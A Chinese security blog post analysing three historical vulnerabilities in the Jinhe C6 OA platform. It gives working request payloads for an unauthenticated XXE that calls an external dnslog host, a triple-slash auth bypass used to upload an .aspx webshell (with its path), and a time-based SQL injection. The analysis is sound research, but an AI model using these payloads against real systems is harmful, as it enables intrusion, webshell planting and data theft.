#  金和oa协同管理平台历史漏洞分析三则   
原创 chobits02  C4安全团队   2024-03-26 20:18  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJRLLtYBSPZSrvHpKCMpR33fZXDsFfCUiaMUEFNjwibYVCIEMh5nHZ64C3ic4obBScxEJqbEdP461QGAg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
金和oa协同管理平台（又称金和C6协调管理平台），共有20多个应用模块，160多个应用子模块，涉及的企业管理业务包括协同办公管理、人力资源管理、项目管理、客户关系管理、企业目标管理、费用管理等多个业务范围。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmR85YolujpWp7Vibia4uwJrwy4Q5yVbXuNsaBicLmZuSnjM7AiaoW3Aicx1ZA/640?wx_fmt=png&from=appmsg "")  
  
  
C6协同管理系统漏洞实在太多，远不止公开的那些漏洞，我就挑几个典型来分析下。  
1. **XXE漏洞**  
  
漏洞所在代码为  
J  
HSoft.Web.Message.dll  
  
XmlDeal类中初始化方法为Page_Load，会接收输入流中的xml代码进行解析，且没有做鉴权  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRvm0pY8Xiat9Y7bwRAXCSlNMPor6qx6J38VUElsFJ28biaMK9fQxExH2Q/640?wx_fmt=png&from=appmsg "")  
  
因此直接请求即可  
```
POST /c6/JHSoft.Web.Message/XmlDeal.aspx HTTP/1.1
Host: xxxx
Content-Type: application/Xml
 
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://iohndteton.dgrh3.cn/"> %remote;]>'
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRMQqTibVGU9waT0t8L0bcAqemibF61oEsHxIVPTHQpWts9SVOkZI8N0NA/640?wx_fmt=png&from=appmsg "")  
  
dnslog接收到请求信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRMjHxaLSWqocgicOicibeiaVP4cUDI2F2doh8ROkeWt9pnHLgfjZDguJIEg/640?wx_fmt=png&from=appmsg "")  
  
  
  
**2.任意文件上传**  
  
这个漏洞因为没有前端代码，分析起来只能靠一半的猜解  
  
漏洞URL路径为  
```
/C6/JHSoft.Web.Portal/EditMain.aspx///?id=1.aspx
```  
  
  
  
漏洞代码在  
JHSoft.Web.Portal.dll的EditMain类中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRcKzqQz1Biaj55dNYWiaXGmdyzeTnEIt27a6ia4fM6otHcUErEBUicgJEgQ/640?wx_fmt=png&from=appmsg "")  
  
该类初始化方法Page_Load接收两个参数add和id，add为文件保存路径，id为文件名  
  
add不传参时默认保存路径为\  
JHSoft.Web.Portal\Default\  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRvh5dbtEnh9K7EnzWickayaibg4ibrysia5v7cKa2hNwTcExOu7XSmI1ZaQ/640?wx_fmt=png&from=appmsg "")  
  
回到漏洞URL，访问  
/C6/JHSoft.Web.Portal/EditMain.aspx///?id=1.aspx  
  
其中三个斜杠///，起到了权限绕过的作用，无需鉴权即可访问接口  
  
传参id为1.aspx，使得最终保存文件名为1.aspx  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmR71c4MyzDRNmO2VFrOk7b9bkakCn26McIcQPA6nguh95S5F18CZIcmw/640?wx_fmt=png&from=appmsg "")  
  
在上方输入框中输入一句话，点击保存按钮（btn_save）后会调用对应的方法，即btn_server_click方法，保存文件到服务器![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRmgWg13RjaehJBc79ib3ENicicxw0LQ7gamUpy0uibiaYfeBketYFwiaibcTgw/640?wx_fmt=png&from=appmsg "")  
  
  
之后保存的shell地址就为  
```
/C6/JHSoft.Web.Portal/Default///1.aspx/
```  
  
连接即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRLrjWo9nTm0iahNIbkItu7woicic0Ay0cUI6dq2giamFkFVd454TH5m6Vaw/640?wx_fmt=png&from=appmsg "")  
  
  
**3.SQL注入**  
  
我也审了不少C6的注入了，其实都很朴实无华，接口没有鉴权+SQL语句中直接拼接参数  
  
举个例子，下面的URL参数  
Ince  
ntiveID和TVersion存在SQL注入  
```
/C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfill.aspx/?IncentiveID=1%20WAITFOR%20DELAY%20'0:0:5'--&TVersion=1
```  
  
漏洞代码在  
JHSoft.Web.IncentivePlan.dll中  
  
接收参数IncentiveID和TVersion之后，进行初始化GetPlanInfoInit  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRXFXibg88dpJINPpCSicFTEkEFUPiaO1E8yPp9BcO3uvaHClPj9vkQTxnw/640?wx_fmt=png&from=appmsg "")  
  
然后再调用了GetAppFlagById，继续传参  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRD1E8nvcTHomgicFeG6Q5H3EMjw7FqL6Gk3LiaWENsgnTvdvkHCiafHKJg/640?wx_fmt=png&from=appmsg "")  
  
最后竟直接拼接在SQL语句中然后执行，造成SQL注入  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJTEfGL8Gvh3mdfVHOHic4qmRmtZCXIbtxC3cVa8ZH6FyyMVX8jGx4IvYY1tTGxlNEMicXg1Myz5iabEg/640?wx_fmt=png&from=appmsg "")  
  
  
  
END  
  
  
关注HackingWiki漏洞感知  
  
了解更多安全相关内容  
  
  
  
  
